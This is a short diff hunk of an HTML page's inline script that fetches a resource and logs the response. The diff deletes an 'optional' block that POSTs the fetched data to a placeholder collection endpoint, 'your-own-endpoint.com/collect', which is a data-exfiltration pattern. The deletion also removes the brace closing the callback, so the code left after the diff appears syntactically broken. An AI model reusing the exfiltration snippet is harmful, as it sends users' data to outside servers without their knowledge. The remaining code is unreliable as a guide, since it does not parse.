@@ -9,13 +9,6 @@
       .then(response => response.text())
       .then(data => {
         console.log("RESPONSE:", data);
-        // Optionally, send to your own server:
-        fetch("https://your-own-endpoint.com/collect", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ data: data })
-        });
-      })
       .catch(error => console.error("Error:", error));
     </script>
   </body>
